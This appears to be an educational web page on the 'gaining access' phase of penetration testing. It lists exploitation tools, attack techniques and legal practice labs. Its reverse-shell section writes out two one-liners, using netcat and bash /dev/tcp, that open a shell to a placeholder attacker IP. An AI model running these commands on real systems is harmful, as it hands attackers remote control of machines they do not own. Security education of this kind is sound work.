---
layout: default
title: Gaining Access
permalink: /cybersecurity/gaining-access/
---

# Gaining Access 🎯

The third phase of the penetration testing methodology: exploiting discovered vulnerabilities to gain unauthorized access to target systems.

## What This Phase Is About

Once scanning identifies open ports, services, and potential vulnerabilities, the next step is to **exploit** them. This phase bridges the gap between identifying weaknesses and actually breaking in.

## Tools & Frameworks

- **[Metasploit](https://www.metasploit.com/)** — The most widely used penetration testing framework, with exploits for thousands of vulnerabilities.
- **[Burp Suite](https://portswigger.net/burp)** — Intercepting proxy for finding and exploiting web application flaws (SQLi, XSS, auth bypass).
- **[sqlmap](https://sqlmap.org/)** — Automated tool for detecting and exploiting SQL injection flaws.
- **[Hydra](https://github.com/vanhauser-thc/thc-hydra)** — Fast network logon cracker supporting many protocols (SSH, FTP, HTTP forms).
- **[John the Ripper](https://www.openwall.com/john/)** — Offline password cracking.
- **[Empire](https://www.powershellempire.com/)** — Post-exploitation and command & control framework.

## Common Exploitation Techniques

### Web Application Attacks
- SQL Injection (SQLi)
- Cross-Site Scripting (XSS)
- Cross-Site Request Forgery (CSRF)
- Authentication & Authorization bypass
- File upload and path traversal attacks

### Network & Service Attacks
- Exploiting unpatched software (using known CVEs)
- Default credentials & weak passwords
- SMB / RDP exploitation
- Man-in-the-Middle (MITM) attacks

### Client-Side Attacks
- Phishing with malicious payloads
- Malicious documents (macro-based droppers)
- Browser exploitation

## Reverse Shells 🐚

A reverse shell is a technique where the attacker connects **to** the target, rather than waiting for connections to the attacker. The target machine initiates the connection back, often bypassing firewalls.

```bash
# Classic netcat reverse shell (from the target)
nc -e /bin/sh ATTACKER_IP 4444

# Bash reverse shell (from the target)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

## Zero-Day Exploits

Zero-days are vulnerabilities unknown to the vendor, with **no patch available**. They are the most dangerous and valuable form of exploit. Track them via:

- [CVE Database](https://cve.mitre.org/) — Mitre's public vulnerability registry
- [Exploit-DB](https://www.exploit-db.com/) — Public exploit archive
- [NVD](https://nvd.nist.gov/) — NIST National Vulnerability Database

## Practice Legally ✅

- **[TryHackMe](https://tryhackme.com/)** — Guided rooms for learning exploitation
- **[Hack The Box](https://www.hackthebox.eu/)** — Realistic vulnerable machines
- **[VulnHub](https://www.vulnhub.com/)** — Downloadable vulnerable VMs
- **[PortSwigger Web Security Academy](https://portswigger.net/web-security)** — Free web exploit labs

## Next Steps

Once you gain access, move to [Stabilizing Access](../stabilizing-access/) to learn how to maintain your foothold.

[← Back to Cybersecurity Hub](../)

<!-- 愛をこめて ダンテが作りました -->
